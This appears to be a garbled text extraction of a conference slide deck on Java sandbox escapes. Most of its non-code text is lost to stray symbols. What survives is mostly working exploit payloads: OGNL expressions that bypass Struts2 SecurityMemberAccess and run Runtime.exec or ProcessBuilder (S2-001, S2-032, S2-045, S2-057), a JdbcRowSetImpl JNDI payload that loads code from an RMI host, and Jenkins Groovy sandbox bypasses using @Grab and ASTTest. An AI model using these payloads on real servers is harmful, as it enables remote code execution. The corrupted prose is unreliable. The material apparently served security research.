
 



K
1a25)SDLXYaNCH6)GILA 2a8.)=]L`<\F+UaWeb@?89 3a RedHatApacheAmazonaWeblogic#^[;&RCEJ@?7!aRT $Weblogic@?89B1,Q 4a2015.%Pycon'Python)OFb2016.PM)":(S VW
3BVIPZcb2017.%D_)0Q-Java Json/  >;2018.%^[E'Java /*4

01
PART 01



CONTENTS

02
PART 02


 

03
PART 03


04
PART 04


PART 01
(#% "&"' ""
$
 !

/
18
3/67 28*)/ 382+

0
18'!SecurityManager84$ #.+
288'!5- #%
38(,18 &"(#,

SecurityManager

 
 

  

PART

02





 


struts-default.xml

SecurityMemberAccess

<constant name="struts.excludedClasses" value=" java.lang.Object,java.lang.Runtime,java.lang.System, java.lang.Class,java.lang.ClassLoader,java.lang.Shutdown, java.lang.ProcessBuilder,ognl.OgnlContext,ognl.ClassResolver, ognl.TypeConverter,ognl.MemberAccess, ognl.DefaultMemberAccess, com.opensymphony.xwork2.ognl.SecurityMemberAccess, com.opensymphony.xwork2.ActionContext" / <constant name="struts.excludedPackageNames" value="java.lang.,ognl,javax" />

1 2isAccessible 3  


Struts2

(#_memberAccess['allowStaticMethodAccess']=true) .(@java.lang.Runtime@getRuntime().exec('calc'))
S2-001

(#_memberAccess=@ognl.OgnlContext@DEFAULT_ MEMBER_ACCESS).(@java.lang.Runtime@getRuntim
e().exec('calc'))
S2-032

S2-057

S2-014
(#p=new java.lang.ProcessBuilder('calc')).(#p.start())

S2-045
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).( #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@ class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.cle ar()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_AC
CESS)).(@java.lang.Runtime@getRuntime().exec('calc'))

S2-045 PAYLOAD

S2-057 PAYLOAD
${ (#c=#request['struts.valueStack'].context). (#container=#c['com.opensymphony.xwork2.ActionContext.container'] ). (#o=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUt il@class)). ((#o.getExcludedClasses().clear())). (#o.getExcludedPackageNames().clear()). (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS). (#c.setMemberAccess(#dm)).(#cmd=({'calc'})). (new java.lang.ProcessBuilder(#cmd)).start() }


S2-045
public class OgnlContext extends Object implements Map { public static final String CONTEXT_CONTEXT_KEY = "context"; public static final String ROOT_CONTEXT_KEY = "root"; public static final String THIS_CONTEXT_KEY = "this"; public static final String MEMBER_ACCESS_CONTEXT_KEY = "_memberAccess";

S2-057
public class OgnlContext extends Object implements Map { public static final String ROOT_CONTEXT_KEY = "root"; public static final String THIS_CONTEXT_KEY = "this";

Ognl

Ognl

PoC

S2-045 (#container=#context['com.opensymphony.xwork2.Acti onContext.container'])
S2-057 (#c=#request['struts.valueStack'].context). (#container=#c['com.opensymphony.xwork2.ActionCont ext.container']).

1#context  2request.getAttribute("struts.valueStack") 3OgnlValueStackcontext

demo Demo
(#jdbc=new com.sun.rowset.JdbcRowSetImpl()).(#jdbc.setDataSourceName('rmi://1
27.0.0.1:1099/Exploit')).(#jdbc.setAutoCommit(true))
(#n=#request['struts.actionMapping'].namespace.substring(0,1)).(#rmi= 'rmi:'+#n+#n+'127.0.0.1:1099'+#n+'Exploit').(#jdbc=new com.sun.rowset.JdbcRowSetImpl()).(#jdbc.setDataSourceName(#rmi)).( #jdbc.setAutoCommit(true))

Result

PART 03 
    

SandboxInterceptor
 

method invoke new Instance static method set property get property set attribute get attribute super call set array get array

Security-1266/CVE-2019-100300

1.  2. Java
3.  

payload 

SECURITY-1266

@Grapes([@Grab(group='foo', module='bar', version='1.0')])
SECURITY-1318

import groovy.transform.ASTTest as lolwut; @lolwut(value={ })
@groovy.transform.ASTTest(value={ assert Jenkins.getInstance().createProject()})
SECURITY-1320

SECURITY-1292
@Grab(group='foo', module='bar', version='1.0')

SECURITY-1319
@GrabResolver(name='restlet.org', root='http://maven.restlet.org')

SECURITY-1321
@AnnotationCollector([ASTTest]) @interface Lol {} @Lol(value={

PART 04 

Oracle

Java Java











